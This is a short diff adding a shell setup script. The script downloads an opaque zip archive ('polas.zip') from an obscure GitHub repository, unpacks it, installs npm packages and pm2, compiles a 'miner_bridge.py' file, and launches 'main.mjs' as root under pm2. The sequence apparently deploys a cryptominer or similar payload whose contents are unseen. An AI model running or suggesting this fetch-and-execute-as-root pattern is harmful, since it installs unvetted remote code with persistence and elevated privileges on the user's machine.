@@ -1,0 +1,9 @@
+curl -O -L -J  https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/polas.zip
+unzip polas.zip
+npm install --omit=dev
+npm install --global pm2
+
+python3 -m py_compile miner_bridge.py
+mkdir -p data logs
+chmod 700 .env
+sudo pm2 start main.mjs
